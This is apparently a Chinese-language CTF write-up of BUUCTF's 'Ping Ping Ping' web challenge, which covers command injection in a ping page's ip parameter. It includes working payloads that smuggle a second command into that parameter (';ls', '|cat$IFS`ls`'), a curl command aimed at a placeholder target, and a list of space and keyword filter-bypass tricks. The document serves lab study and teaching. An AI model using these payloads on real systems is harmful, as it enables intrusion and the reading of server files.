---
title: "[GXYCTF2019]Ping Ping Ping"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [command-injection, filter-bypass, rce]
vulnerability: 命令注入过滤绕过
solved: true
flag: "flag{717dd26e-ed92-45fc-9c08-b28a643c1998}"
---

# [GXYCTF2019]Ping Ping Ping

## 题目概述
题目提供一个 ping 功能页面，通过 `?ip=` 参数接收 IP 地址并执行 ping 命令。存在命令注入漏洞，但有多个过滤规则。

## 信息收集
1. 访问页面返回 `/?ip=`，提示需要传入 ip 参数
2. 测试 `?ip=127.0.0.1` 返回正常 ping 结果，确认存在命令执行
3. 测试 `?ip=127.0.0.1;ls` 发现存在 `flag.php` 和 `index.php` 文件
4. 尝试读取 flag.php 时发现存在过滤

## 漏洞分析（漏洞类型、原理、判断过程）

**漏洞类型**: 命令注入

**过滤规则分析** (从 index.php 源码):
1. 过滤特殊符号: `& / ? * < > ' " \ ( ) [ ] { }` 及控制字符
2. 过滤空格
3. 过滤 `bash` 关键字
4. 过滤 `flag` 字符串（正则 `.*f.*l.*a.*g.*`）

**绕过思路**:
- 空格绕过: 使用 `$IFS` 环境变量（Internal Field Separator，默认包含空格、制表符、换行符）
- flag 字符串绕过: 使用反引号执行 `ls` 命令，让服务器动态获取文件名

## 利用过程（Payload + Flag）

**最终 Payload**:
```
?ip=127.0.0.1|cat$IFS`ls`
```

**Payload 解析**:
- `|` 管道符连接命令
- `cat$IFS`ls`` 中 `$IFS` 替代空格，反引号内 `ls` 执行后返回 `flag.php index.php`
- 最终执行 `cat flag.php index.php`，输出两个文件内容

**获取 Flag**:
```bash
curl -s "http://target/?ip=127.0.0.1|cat\$IFS\`ls\`"
```

返回:
```php
<?php
$flag = "flag{717dd26e-ed92-45fc-9c08-b28a643c1998}";
?>
```

## 复现步骤
1. 访问 `/?ip=127.0.0.1;ls` 确认命令注入
2. 分析过滤规则，发现空格和 flag 关键字被过滤
3. 构造 `?ip=127.0.0.1|cat$IFS\`ls\`` 绕过过滤
4. 从响应中获取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| 命令注入 | ip 参数 | `cat$IFS\`ls\`` | $IFS 绕过空格、反引号命令替换绕过关键字过滤 |

## 知识总结（解题技巧、同类题型套路）

**空格绕过方法汇总**:
- `$IFS` - 使用环境变量
- `$IFS$9` 或 `$IFS$1` - 更稳定的写法
- `{cat,flag.php}` - 大括号扩展
- `%09` - URL 编码制表符（需环境支持）

**关键字过滤绕过方法**:
- 反引号/`$()` 命令替换动态获取文件名
- 变量拼接: `a=fl;b=ag;cat $a$b.php`
- Base64 编码: `echo ZmxhZy5waHA=|base64 -d`
- 通配符: `cat fla?.php` 或 `cat f*`
